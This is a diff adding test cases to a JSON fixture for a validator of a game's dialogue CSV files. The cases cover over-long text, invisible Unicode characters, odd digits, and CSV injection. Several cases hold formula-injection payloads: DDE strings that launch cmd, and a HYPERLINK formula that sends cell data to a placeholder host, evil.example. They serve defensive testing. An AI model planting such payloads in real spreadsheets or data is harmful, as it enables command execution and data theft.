@@ -561,5 +561,238 @@
    "dialogue/scenarios.csv:2:3:",
    "join clauses with ' & ' (not 'and')"
   ]
+ },
+ {
+  "name": "reaction over the 80-character bubble",
+  "file": "dialogue/responses.csv",
+  "row": 2,
+  "column": "reaction_text",
+  "value": "Bless you, {ruler}! We will not forget this, not this winter, not the next one, ever.",
+  "expect": [
+   "dialogue/responses.csv:2:5:",
+   "85 characters; the limit is 80"
+  ]
+ },
+ {
+  "name": "text starting with = (CSV injection)",
+  "file": "dialogue/scenarios.csv",
+  "row": 2,
+  "column": "question_text",
+  "value": "=cmd|' /C calc'!A0",
+  "expect": [
+   "dialogue/scenarios.csv:2:8:",
+   "text may not start with '='",
+   "CSV injection"
+  ]
+ },
+ {
+  "name": "text starting with +",
+  "file": "dialogue/responses.csv",
+  "row": 3,
+  "column": "response_text",
+  "value": "+5 rations for everyone.",
+  "expect": [
+   "dialogue/responses.csv:3:4:",
+   "text may not start with '+'"
+  ]
+ },
+ {
+  "name": "text starting with -",
+  "file": "dialogue/responses.csv",
+  "row": 3,
+  "column": "reaction_text",
+  "value": "-2+3+cmd|' /C calc'!A0",
+  "expect": [
+   "dialogue/responses.csv:3:5:",
+   "text may not start with '-'"
+  ]
+ },
+ {
+  "name": "text starting with @",
+  "file": "dialogue/consequences.csv",
+  "row": 2,
+  "column": "notice_text",
+  "value": "@SUM(1+1)*cmd|' /C calc'!A0",
+  "expect": [
+   "dialogue/consequences.csv:2:10:",
+   "text may not start with '@'"
+  ]
+ },
+ {
+  "name": "full-width digits in a number",
+  "file": "dialogue/scenarios.csv",
+  "row": 2,
+  "column": "priority",
+  "value": "\uff18\uff10",
+  "expect": [
+   "dialogue/scenarios.csv:2:4:",
+   "is not a whole number"
+  ]
+ },
+ {
+  "name": "Arabic-Indic digits in a number",
+  "file": "dialogue/decisions.csv",
+  "row": 2,
+  "column": "rep_honor",
+  "value": "\u0661",
+  "expect": [
+   "dialogue/decisions.csv:2:",
+   "[rep_honor]",
+   "is not a whole number"
+  ]
+ },
+ {
+  "name": "underscore in a number",
+  "file": "dialogue/scenarios.csv",
+  "row": 2,
+  "column": "cooldown_s",
+  "value": "3_00",
+  "expect": [
+   "dialogue/scenarios.csv:2:5:",
+   "'3_00' is not a whole number"
+  ]
+ },
+ {
+  "name": "non-ASCII digits in a condition",
+  "file": "dialogue/scenarios.csv",
+  "row": 2,
+  "column": "trigger",
+  "value": "kingdom.fed_ratio < \u0660.6",
+  "expect": [
+   "dialogue/scenarios.csv:2:3:",
+   "is not a number"
+  ]
+ },
+ {
+  "name": "right-to-left override in text",
+  "file": "dialogue/responses.csv",
+  "row": 2,
+  "column": "reaction_text",
+  "value": "Bless\u202eyou, {ruler}!",
+  "expect": [
+   "dialogue/responses.csv:2:5:",
+   "invisible character U+202E (right-to-left override) at position 6"
+  ]
+ },
+ {
+  "name": "soft hyphen in text",
+  "file": "dialogue/scenarios.csv",
+  "row": 3,
+  "column": "thought_text",
+  "value": "My tools are worn\u00adthin.",
+  "expect": [
+   "dialogue/scenarios.csv:3:7:",
+   "invisible character U+00AD (soft hyphen) at position 18"
+  ]
+ },
+ {
+  "name": "formula at the start of a notes cell",
+  "file": "dialogue/scenarios.csv",
+  "row": 2,
+  "column": "notes",
+  "value": "=HYPERLINK(\"http://evil.example/?x=\"&A2,\"see\")",
+  "expect": [
+   "dialogue/scenarios.csv:2:9:",
+   "a spreadsheet would run this note as a formula (CSV injection)"
+  ]
+ },
+ {
+  "name": "at-sign formula in decision notes",
+  "file": "dialogue/decisions.csv",
+  "row": 2,
+  "column": "notes",
+  "value": "@SUM(1+1)*cmd|' /C calc'!A0",
+  "expect": [
+   "dialogue/decisions.csv:2:26:",
+   "a spreadsheet would run this note as a formula"
+  ]
+ },
+ {
+  "name": "DDE link after a minus in actions.direct",
+  "file": "reputation/actions.csv",
+  "row": 2,
+  "column": "direct",
+  "value": "-2+3+cmd|' /C calc'!A0",
+  "expect": [
+   "reputation/actions.csv:2:4:",
+   "a spreadsheet would run this note as a formula"
+  ]
+ },
+ {
+  "name": "param on a cue consequence",
+  "file": "dialogue/consequences.csv",
+  "row": 7,
+  "column": "param",
+  "value": "=cmd|' /C calc'!A0",
+  "expect": [
+   "dialogue/consequences.csv:7:5:",
+   "kind 'cue' takes no param (leave it empty)"
+  ]
+ },
+ {
+  "name": "arabic letter mark in text",
+  "file": "dialogue/responses.csv",
+  "row": 2,
+  "column": "reaction_text",
+  "value": "Bless\u061cyou, {ruler}!",
+  "expect": [
+   "dialogue/responses.csv:2:5:",
+   "invisible character U+061C (arabic letter mark) at position 6"
+  ]
+ },
+ {
+  "name": "invisible operator in text",
+  "file": "dialogue/responses.csv",
+  "row": 2,
+  "column": "reaction_text",
+  "value": "Bless\u2062you, {ruler}!",
+  "expect": [
+   "dialogue/responses.csv:2:5:",
+   "invisible character U+2062 (invisible times) at position 6"
+  ]
+ },
+ {
+  "name": "tag character in text",
+  "file": "dialogue/scenarios.csv",
+  "row": 2,
+  "column": "thought_text",
+  "value": "My children are hungry\udb40\udc41",
+  "expect": [
+   "dialogue/scenarios.csv:2:7:",
+   "invisible character U+E0041 (tag latin capital letter a) at position 23"
+  ]
+ },
+ {
+  "name": "hangul filler in a name",
+  "file": "citizens/names.csv",
+  "row": 2,
+  "column": "name",
+  "value": "Ada\u3164",
+  "expect": [
+   "citizens/names.csv:2:2:",
+   "invisible character U+3164 (hangul filler) at position 4"
+  ]
+ },
+ {
+  "name": "mongolian vowel separator in notes",
+  "file": "dialogue/scenarios.csv",
+  "row": 2,
+  "column": "notes",
+  "value": "draft\u180enote",
+  "expect": [
+   "dialogue/scenarios.csv:2:9:",
+   "invisible character U+180E (mongolian vowel separator) at position 6"
+  ]
+ },
+ {
+  "name": "reaction that overflows the bubble once names are filled in",
+  "file": "dialogue/responses.csv",
+  "row": 2,
+  "column": "reaction_text",
+  "value": "{ruler}, {name} thanks you; the {occupation}s of {kingdom} will remember it well",
+  "expect": [
+   "dialogue/responses.csv:2:5:",
+   "with the longest names filled in ({ruler} 20, {name} 16, {occupation} 24, {kingdom} 20 characters) this text can reach 126 characters, but the bubble shows 80 and cuts the rest: shorten it"
+  ]
  }
 ]
